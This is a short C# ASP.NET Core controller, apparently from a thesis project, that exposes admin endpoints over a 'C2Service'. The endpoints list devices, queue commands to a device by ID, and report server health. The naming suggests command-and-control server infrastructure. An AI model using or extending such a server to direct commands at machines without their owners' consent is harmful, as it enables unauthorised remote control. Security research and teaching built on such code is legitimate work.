using Microsoft.AspNetCore.Mvc;
using tesis.Services;
using System;
using System.Threading.Tasks;

namespace tesis.Controllers
{
    [Route("api/[controller]")] // Ruta base: api/Admin
    [ApiController]
    public class AdminController : ControllerBase
    {
        private readonly C2Service _c2Service;

        public AdminController(C2Service c2Service)
        {
            _c2Service = c2Service;
        }

      
        [HttpGet("devices")]
        public IActionResult GetDevices()
        {
            var devices = _c2Service.GetAllDevices();
            return Ok(devices);
        }

        // --- 2. FUNCIÓN ANTIGUA (Sigue funcionando) ---
        [HttpPost("send-command")]
        public async Task<IActionResult> SendCommand([FromBody] DTOs.CommandDto dto)
        {
            var success = await _c2Service.QueueCommandAsync(dto.DeviceId, dto.Command);
            if (!success) return NotFound("Dispositivo no encontrado");
            return Ok(new { message = "Orden enviada" });
        }

        // --- 3. NUEVA FUNCIÓN (Agregada sin tocar las otras) ---
        [HttpGet("health")]
        public IActionResult HealthCheck()
        {
            return Ok(new { status = "Online", time = DateTime.Now });
        }
    }
}